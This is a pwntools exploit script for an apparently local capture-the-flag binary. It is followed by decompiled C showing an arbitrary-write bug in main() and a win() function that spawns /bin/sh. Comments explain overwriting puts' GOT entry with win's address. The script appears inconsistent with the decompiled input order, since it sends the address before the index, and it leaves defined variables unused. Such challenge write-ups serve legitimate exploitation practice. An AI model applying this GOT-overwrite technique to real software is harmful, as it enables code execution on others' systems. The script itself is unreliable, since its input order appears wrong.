from pwn import *

win_func = 0x00401226

p = process('./chall_08')

offset = 0x10

elf = ELF(p.elf.path)

p.sendline(str(elf.sym['win']))
p.sendline(str((elf.got.puts - elf.sym.target) // 8)) # calculate how far away puts is from target, and since we
# are multiplying it by 8 in the code, we restore the original distance that target is from puts, so therefore we
# can override what location is at puts with the location of win, so next time puts is called, it calls win

"""
Decompiled

void main(void)
{
  undefined8 local_18;
  int local_c;
  
  __isoc99_scanf(&%d,&local_c);
  __isoc99_scanf(&%ld,&local_18);
  *(undefined8 *)(target + (long)local_c * 8) = local_18;
  puts("hi");
  return;
}

void win(void)
{
  system("/bin/sh");
  return;
}
"""